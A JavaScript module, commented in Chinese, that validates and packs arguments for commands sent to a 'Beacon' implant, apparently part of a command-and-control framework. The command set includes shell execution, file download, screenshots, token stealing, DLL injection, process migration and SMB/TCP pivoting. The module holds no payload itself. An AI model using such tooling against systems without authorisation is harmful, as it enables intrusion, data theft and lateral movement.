/**
 * 命令参数构建模块 - Beacon 命令参数的类型化封装与校验
 *
 * 提供参数类型判断、数值解析和各命令的参数组装逻辑，
 * 确保下发到 Beacon 的命令参数格式正确且经过校验。
 */

// ─── 导入 ───

import { COMMAND_ID, PLUGIN_COMMAND_ID } from '../../../constants/commands.js'

// ─── 参数类型判断与构造 ───

const ARG_KIND = Object.freeze({
  STRING: 'string',
  INT32: 'int32',
  SHORT: 'short',
  BOOL: 'bool',
  BYTES: 'bytes',
})

const FILE_CHUNK_SIZE_DEFAULT = 524288
const FILE_CHUNK_SIZE_MIN = 65536
const FILE_CHUNK_SIZE_MAX = 1048576
const CHUNKS_PER_HEARTBEAT_DEFAULT = 3
const CHUNKS_PER_HEARTBEAT_MAX = 5

function normalizeArgKind(kind) {
  const normalized = String(kind || ARG_KIND.STRING).trim().toLowerCase()
  if (normalized === 'int16') return ARG_KIND.SHORT
  if (Object.values(ARG_KIND).includes(normalized)) return normalized
  throw new Error(`不支持的命令参数类型: ${kind}`)
}

/**
 * 判断值是否为标准的 Beacon 类型化参数对象
 * @param {*} value - 待检测值
 * @returns {boolean} 是否为 {kind, value} 结构
 */
export function isBeaconArg(value) {
  return Boolean(
    value &&
    typeof value === 'object' &&
    !Array.isArray(value) &&
    typeof value.kind === 'string' &&
    Object.prototype.hasOwnProperty.call(value, 'value')
  )
}

/**
 * 构造标准的 Beacon 类型化参数对象
 * @param {string} kind - 参数类型（string / int32 / short / bool / bytes）
 * @param {*} value - 参数值
 * @returns {{kind: string, value: *}}
 */
export function makeBeaconArg(kind, value) {
  return { kind: normalizeArgKind(kind), value }
}

// ─── 数值解析 ───

/**
 * 将值解析为 int32 范围内的整数
 * @param {*} value - 待解析值
 * @param {string} label - 参数标签（用于错误提示）
 * @returns {number} 解析后的整数
 */
export function parseInt32Arg(value, label = '参数') {
  const text = String(value ?? '').trim()
  if (!text) {
    throw new Error(`${label} 不能为空`)
  }

  const numeric = Number(text)
  if (!Number.isFinite(numeric) || !Number.isInteger(numeric)) {
    throw new Error(`${label} 必须是整数`)
  }
  if (numeric < -2147483648 || numeric > 2147483647) {
    throw new Error(`${label} 超出 int32 范围`)
  }

  return numeric
}

/**
 * 将值解析为 int16 (short) 范围内的整数
 * @param {*} value - 待解析值
 * @param {string} label - 参数标签
 * @returns {number} 解析后的整数
 */
export function parseInt16Arg(value, label = '参数') {
  const numeric = parseInt32Arg(value, label)
  if (numeric < -32768 || numeric > 32767) {
    throw new Error(`${label} 超出 short 范围`)
  }
  return numeric
}

/**
 * 将值解析为 uint32 范围内的无符号整数
 * @param {*} value - 待解析值
 * @param {string} label - 参数标签
 * @returns {number} 解析后的无符号整数
 */
export function parseUint32Arg(value, label = '参数') {
  const text = String(value ?? '').trim()
  if (!text) {
    throw new Error(`${label} 不能为空`)
  }

  const numeric = Number(text)
  if (!Number.isFinite(numeric) || !Number.isInteger(numeric)) {
    throw new Error(`${label} 必须是整数`)
  }
  if (numeric < 0 || numeric > 4294967295) {
    throw new Error(`${label} 超出 uint32 范围`)
  }

  return numeric
}

/**
 * 将值解析为布尔值
 * @param {*} value - 待解析值
 * @param {string} label - 参数标签
 * @returns {boolean} 解析后的布尔值
 */
export function parseBoolArg(value, label = '参数') {
  if (typeof value === 'boolean') return value

  const text = String(value ?? '').trim().toLowerCase()
  if (['1', 'true', 'yes', 'on'].includes(text)) return true
  if (['0', 'false', 'no', 'off', ''].includes(text)) return false

  throw new Error(`${label} 必须是布尔值`)
}

function parseInt32RangeArg(value, label, min, max) {
  const numeric = parseInt32Arg(value, label)
  if (numeric < min || numeric > max) {
    throw new Error(`${label} 必须在 ${min}-${max} 之间`)
  }
  return numeric
}

function normalizeFileChunkSize(value) {
  const numeric = optionalInt32Value(value, FILE_CHUNK_SIZE_DEFAULT, 'chunk_size')
  if (numeric <= 0) return FILE_CHUNK_SIZE_DEFAULT
  if (numeric < FILE_CHUNK_SIZE_MIN) return FILE_CHUNK_SIZE_MIN
  if (numeric > FILE_CHUNK_SIZE_MAX) return FILE_CHUNK_SIZE_MAX
  return numeric
}

function normalizeChunksPerHeartbeat(value) {
  const numeric = optionalInt32Value(value, CHUNKS_PER_HEARTBEAT_DEFAULT, 'chunks_per_heartbeat')
  if (numeric <= 0) return CHUNKS_PER_HEARTBEAT_DEFAULT
  return Math.min(numeric, CHUNKS_PER_HEARTBEAT_MAX)
}

// ─── 参数归一化 ───

/**
 * 将任意值归一化为标准的 Beacon 类型化参数
 * @param {*} arg - 原始参数值
 * @returns {{kind: string, value: *}} 归一化后的参数对象
 */
export function normalizeBeaconArg(arg) {
  if (isBeaconArg(arg)) {
    const kind = normalizeArgKind(arg.kind)
    if (kind === ARG_KIND.BOOL) {
      return makeBeaconArg(ARG_KIND.BOOL, parseBoolArg(arg.value))
    }
    if (kind === ARG_KIND.INT32) {
      return makeBeaconArg(ARG_KIND.INT32, parseInt32Arg(arg.value))
    }
    if (kind === ARG_KIND.SHORT) {
      return makeBeaconArg(ARG_KIND.SHORT, parseInt16Arg(arg.value))
    }
    if (kind === ARG_KIND.BYTES) {
      return makeBeaconArg(ARG_KIND.BYTES, String(arg.value ?? '').trim())
    }
    return makeBeaconArg(ARG_KIND.STRING, String(arg.value ?? ''))
  }

  if (typeof arg === 'boolean') {
    return makeBeaconArg(ARG_KIND.BOOL, arg)
  }

  if (typeof arg === 'number') {
    return makeBeaconArg(ARG_KIND.INT32, parseInt32Arg(arg))
  }

  return makeBeaconArg(ARG_KIND.STRING, String(arg ?? ''))
}

function assertArgCount(source, min, max, label) {
  if (source.length < min) {
    throw new Error(`${label} 至少需要 ${min} 个参数`)
  }
  if (max >= 0 && source.length > max) {
    throw new Error(`${label} 最多接受 ${max} 个参数`)
  }
}

function typedValue(arg, expectedKind, label) {
  if (!isBeaconArg(arg)) return undefined
  const typed = normalizeBeaconArg(arg)
  if (typed.kind !== expectedKind) {
    throw new Error(`${label} 必须是 ${expectedKind}`)
  }
  return typed.value
}

function stringArg(arg, label, { required = true } = {}) {
  const typed = typedValue(arg, ARG_KIND.STRING, label)
  const value = typed === undefined ? String(arg ?? '') : String(typed ?? '')
  if (required && !value.trim()) {
    throw new Error(`${label} 不能为空`)
  }
  return makeBeaconArg(ARG_KIND.STRING, value)
}

function stringValue(arg, label, options = {}) {
  return stringArg(arg, label, options).value
}

function int32Value(arg, label) {
  const typed = typedValue(arg, ARG_KIND.INT32, label)
  return typed === undefined ? parseInt32Arg(arg, label) : typed
}

function optionalInt32Value(arg, fallback, label) {
  if (arg === undefined || arg === null) return fallback
  if (!isBeaconArg(arg) && String(arg).trim() === '') return fallback
  return int32Value(arg, label)
}

function bytesArg(arg, label) {
  const typed = typedValue(arg, ARG_KIND.BYTES, label)
  if (typed === undefined) {
    throw new Error(`${label} 必须是 bytes`)
  }
  if (!String(typed || '').trim()) {
    throw new Error(`${label} 不能为空`)
  }
  return makeBeaconArg(ARG_KIND.BYTES, typed)
}

function noArgs(source, label) {
  assertArgCount(source, 0, 0, label)
  return []
}

function countedStringArgs(source, label, count) {
  assertArgCount(source, count, count, label)
  return source.map((arg, index) => stringArg(arg, `${label} arg[${index}]`))
}

function optionalSingleStringArg(source, label) {
  assertArgCount(source, 0, 1, label)
  return source.length === 0 ? [] : [stringArg(source[0], `${label} path`, { required: false })]
}

function uint32WireInt32(value, label) {
  const typed = typedValue(value, ARG_KIND.INT32, label)
  const unsigned = parseUint32Arg(typed === undefined ? value : typed, label)
  return new Int32Array(new Uint32Array([unsigned]).buffer)[0]
}

function binaryFlagValue(value, fallback, label) {
  const numeric = optionalInt32Value(value, fallback, label)
  if (![0, 1].includes(numeric)) {
    throw new Error(`${label} 只能是 0 或 1`)
  }
  return numeric
}

function normalizeMigrateArch(value) {
  const text = String(value ?? '').trim().toLowerCase()
  if (text === 'x86') return 'x86'
  if (['x64', 'amd64', 'x86_64'].includes(text)) return 'x64'
  throw new Error('migrate arch 必须是 x86 或 x64')
}

function buildPostExArgs(source) {
  const subcmd = int32Value(source[0], 'postex subcmd')
  if (subcmd === 6) {
    assertArgCount(source, 8, 8, 'postex_inject_dll')
    const waitMs = parseInt32RangeArg(int32Value(source[1], 'wait_ms'), 'wait_ms', 1, 2147483647)
    const maxRuntimeMs = parseInt32RangeArg(optionalInt32Value(source[2], 0, 'max_runtime_ms'), 'max_runtime_ms', 0, 2147483647)
    const idleTimeoutMs = parseInt32RangeArg(optionalInt32Value(source[3], 0, 'idle_timeout_ms'), 'idle_timeout_ms', 0, 2147483647)
    const pid = parseInt32RangeArg(int32Value(source[6], 'pid'), 'pid', 1, 2147483647)
    return [
      makeBeaconArg(ARG_KIND.INT32, 6),
      makeBeaconArg(ARG_KIND.INT32, waitMs),
      makeBeaconArg(ARG_KIND.INT32, maxRuntimeMs),
      makeBeaconArg(ARG_KIND.INT32, idleTimeoutMs),
      stringArg(source[4] ?? 'postex', 'description'),
      stringArg(source[5] ?? '', 'module_args', { required: false }),
      makeBeaconArg(ARG_KIND.INT32, pid),
      bytesArg(source[7], 'dll_bytes'),
    ]
  }

  if (subcmd === 5) {
    assertArgCount(source, 9, 9, 'postex_spawn_dll')
    const waitMs = parseInt32RangeArg(int32Value(source[1], 'wait_ms'), 'wait_ms', 1, 2147483647)
    const maxRuntimeMs = parseInt32RangeArg(optionalInt32Value(source[2], 0, 'max_runtime_ms'), 'max_runtime_ms', 0, 2147483647)
    const idleTimeoutMs = parseInt32RangeArg(optionalInt32Value(source[3], 0, 'idle_timeout_ms'), 'idle_timeout_ms', 0, 2147483647)
    return [
      makeBeaconArg(ARG_KIND.INT32, 5),
      makeBeaconArg(ARG_KIND.INT32, waitMs),
      makeBeaconArg(ARG_KIND.INT32, maxRuntimeMs),
      makeBeaconArg(ARG_KIND.INT32, idleTimeoutMs),
      stringArg(source[4] ?? 'postex', 'description'),
      stringArg(source[5] ?? '', 'module_args', { required: false }),
      stringArg(source[6], 'spawn_path'),
      stringArg(source[7] ?? '', 'spawn_args', { required: false }),
      bytesArg(source[8], 'dll_bytes'),
    ]
  }

  throw new Error(`未知 postex subcmd: ${subcmd}`)
}

function buildMigrateArgs(source) {
  const subcmd = int32Value(source[0], 'migrate subcmd')
  if (subcmd === 1) {
    assertArgCount(source, 3, 3, 'spawnto')
    return [
      makeBeaconArg(ARG_KIND.INT32, 1),
      makeBeaconArg(ARG_KIND.STRING, normalizeMigrateArch(stringValue(source[1], 'arch'))),
      stringArg(source[2], 'spawn_path'),
    ]
  }
  if (subcmd === 2) {
    assertArgCount(source, 3, 5, 'migrate_spawn')
    return [
      makeBeaconArg(ARG_KIND.INT32, 2),
      stringArg(source[1], 'listener'),
      makeBeaconArg(ARG_KIND.STRING, normalizeMigrateArch(stringValue(source[2], 'arch'))),
      stringArg(source[3] ?? '', 'spawn_path', { required: false }),
      stringArg(source[4] ?? '', 'spawn_args', { required: false }),
    ]
  }
  if (subcmd === 3) {
    assertArgCount(source, 4, 4, 'migrate_inject')
    const pid = parseInt32RangeArg(int32Value(source[3], 'pid'), 'pid', 1, 2147483647)
    return [
      makeBeaconArg(ARG_KIND.INT32, 3),
      stringArg(source[1], 'listener'),
      makeBeaconArg(ARG_KIND.STRING, normalizeMigrateArch(stringValue(source[2], 'arch'))),
      makeBeaconArg(ARG_KIND.INT32, pid),
    ]
  }
  throw new Error(`未知 migrate subcmd: ${subcmd}`)
}

// ─── 特殊命令参数构建 ───

/**
 * 构建 setattr 命令的参数列表
 * @param {Array} args - 原始参数 [targetPath, modifyFlag, ...extra]
 * @returns {Array} 类型化参数数组
 */
export function buildSetAttrArgs(args = []) {
  const source = Array.isArray(args) ? args : []
  if (source.length < 2) {
    throw new Error('setattr 任务参数不完整')
  }

  const targetPath = stringValue(source[0], 'targetPath').trim()
  if (!targetPath) {
    throw new Error('targetPath 不能为空')
  }

  const flag = int32Value(source[1], 'ModifyFlag')
  const typedArgs = [
    makeBeaconArg(ARG_KIND.STRING, targetPath),
    makeBeaconArg(ARG_KIND.INT32, flag),
  ]

  let index = 2
  const nextValue = (label) => {
    if (index >= source.length) {
      throw new Error(`setattr 参数缺少 ${label}`)
    }
    const value = source[index]
    index += 1
    return value
  }

  if (flag & 1) {
    typedArgs.push(stringArg(nextValue('new_name'), 'new_name'))
  }
  if (flag & 2) {
    typedArgs.push(stringArg(nextValue('MTime'), 'MTime'))
  }
  if (flag & 4) {
    typedArgs.push(stringArg(nextValue('ATime'), 'ATime'))
  }
  if (flag & 8) {
    typedArgs.push(stringArg(nextValue('CTime'), 'CTime'))
  }
  if (flag & 16) {
    typedArgs.push(makeBeaconArg(ARG_KIND.INT32, int32Value(nextValue('WinAttributes'), 'WinAttributes')))
  }
  if (flag & 32) {
    typedArgs.push(makeBeaconArg(ARG_KIND.INT32, int32Value(nextValue('LinuxMode'), 'LinuxMode')))
  }

  if (index !== source.length) {
    throw new Error('setattr 参数数量与 ModifyFlag 不匹配')
  }

  return typedArgs
}

/**
 * 根据命令 ID 构建对应的参数列表（主入口）
 * @param {number} commandId - 命令 ID
 * @param {Array} args - 原始参数列表
 * @returns {Array} 类型化参数数组
 */
export function buildBeaconCommandArgs(commandId, args = []) {
  const source = Array.isArray(args) ? args : []

  switch (Number(commandId)) {
    case COMMAND_ID.EXIT:
      return noArgs(source, 'exit')

    case COMMAND_ID.SHELL:
    case COMMAND_ID.POWERSHELL: {
      assertArgCount(source, 1, 1, 'Shell / PowerShell')
      return [stringArg(source[0], 'raw command')]
    }

    case COMMAND_ID.CD:
    case COMMAND_ID.CAT:
    case COMMAND_ID.MKDIR:
    case COMMAND_ID.RM:
      return countedStringArgs(source, '文件命令', 1)

    case COMMAND_ID.MV:
    case COMMAND_ID.CP:
      return countedStringArgs(source, '文件命令', 2)

    case COMMAND_ID.LS:
      return optionalSingleStringArg(source, 'ls')

    case COMMAND_ID.PWD:
    case COMMAND_ID.PS:
    case COMMAND_ID.JOBS:
    case COMMAND_ID.WHOAMI:
    case COMMAND_ID.NETINFO:
    case COMMAND_ID.NETSTAT:
      return noArgs(source, '无参数命令')

    case PLUGIN_COMMAND_ID.EXECUTION_BOF:
      assertArgCount(source, 1, -1, 'BOF')
      return [bytesArg(source[0], 'BOF 工件内容'), ...source.slice(1).map(normalizeBeaconArg)]

    case COMMAND_ID.SLEEP:
      assertArgCount(source, 1, 2, 'sleep')
      return [
        makeBeaconArg(ARG_KIND.INT32, parseInt32RangeArg(int32Value(source[0], 'sleep_ms'), 'sleep_ms', 1, 2147483647)),
        makeBeaconArg(ARG_KIND.INT32, parseInt32RangeArg(optionalInt32Value(source[1], 0, 'jitter'), 'jitter', 0, 2147483647)),
      ]

    case COMMAND_ID.DOWNLOAD:
      assertArgCount(source, 1, 3, 'download')
      return [
        stringArg(source[0], 'remote_path'),
        makeBeaconArg(ARG_KIND.INT32, normalizeFileChunkSize(source[1])),
        makeBeaconArg(ARG_KIND.INT32, normalizeChunksPerHeartbeat(source[2])),
      ]

    case COMMAND_ID.UPLOAD:
      assertArgCount(source, 2, 3, 'upload')
      return [
        stringArg(source[0], 'source_file'),
        stringArg(source[1], 'remote_path'),
        makeBeaconArg(ARG_KIND.INT32, normalizeFileChunkSize(source[2])),
      ]

    case COMMAND_ID.KILLJOB:
      assertArgCount(source, 1, 1, 'killjob')
      return [
        makeBeaconArg(ARG_KIND.INT32, uint32WireInt32(source[0], 'job_id')),
      ]

    case COMMAND_ID.CASCADE_CONNECT_TCP:
      assertArgCount(source, 3, 3, 'connect')
      return [
        stringArg(source[0], 'child_hint', { required: false }),
        stringArg(source[1], 'host'),
        makeBeaconArg(ARG_KIND.INT32, parseInt32RangeArg(int32Value(source[2], 'port'), 'port', 1, 65535)),
      ]
    case COMMAND_ID.CASCADE_LINK_SMB:
      assertArgCount(source, 2, 2, 'link')
      return [
        stringArg(source[0], 'child_hint', { required: false }),
        stringArg(source[1], 'pipe_path'),
      ]
    case COMMAND_ID.CASCADE_ROUTE:
      assertArgCount(source, 2, 2, 'cascade_route')
      return [
        stringArg(source[0], 'child_id'),
        bytesArg(source[1], 'encrypted_task_blob'),
      ]
    case COMMAND_ID.CASCADE_CLOSE:
    case COMMAND_ID.CASCADE_PING:
      return countedStringArgs(source, 'cascade', 1)

    case COMMAND_ID.KILL:
    case COMMAND_ID.STEAL_TOKEN:
      assertArgCount(source, 1, 1, 'pid 命令')
      return [
        makeBeaconArg(ARG_KIND.INT32, parseInt32RangeArg(int32Value(source[0], 'pid'), 'pid', 1, 2147483647)),
      ]

    case COMMAND_ID.SCREENSHOT:
      assertArgCount(source, 0, 2, 'screenshot')
      return [
        makeBeaconArg(ARG_KIND.INT32, parseInt32RangeArg(optionalInt32Value(source[0], 0, 'monitor_id'), 'monitor_id', 0, 2147483647)),
        makeBeaconArg(ARG_KIND.INT32, parseInt32RangeArg(optionalInt32Value(source[1], 80, 'quality'), 'quality', 1, 100)),
      ]

    case COMMAND_ID.SETATTR:
      return buildSetAttrArgs(source)

    case COMMAND_ID.ZIP:
      assertArgCount(source, 2, 4, 'zip')
      return [
        stringArg(source[0], 'source_path'),
        stringArg(source[1], 'zip_path'),
        makeBeaconArg(ARG_KIND.INT32, binaryFlagValue(source[2], 0, 'overwrite')),
        makeBeaconArg(ARG_KIND.INT32, binaryFlagValue(source[3], 1, 'include_root')),
      ]

    case COMMAND_ID.POSTEX:
    case COMMAND_ID.POSTEX_SPAWN_DLL:
    case COMMAND_ID.POSTEX_INJECT_DLL:
      return buildPostExArgs(source)

    case COMMAND_ID.MIGRATE:
    case COMMAND_ID.SPAWNTO:
    case COMMAND_ID.MIGRATE_SPAWN:
    case COMMAND_ID.MIGRATE_INJECT:
      return buildMigrateArgs(source)

    default:
      if (source.length === 0) return []
      return source.map(normalizeBeaconArg)
  }
}
